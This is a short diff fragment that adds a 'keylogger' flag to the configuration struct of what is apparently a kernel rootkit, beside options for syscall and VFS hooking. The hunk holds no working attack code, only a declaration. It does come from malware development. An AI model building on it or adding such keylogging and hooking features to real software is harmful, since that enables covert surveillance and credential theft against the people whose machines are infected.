@@ -15,6 +15,7 @@ struct rootkit_config {
 	int patch_debug;	/* 1 => patch_debug, 0 => die_notifier */
 	int hook_syscall;
 	int hook_vfs;
+	int keylogger;
 };
 extern struct rootkit_config rk_cfg;
 
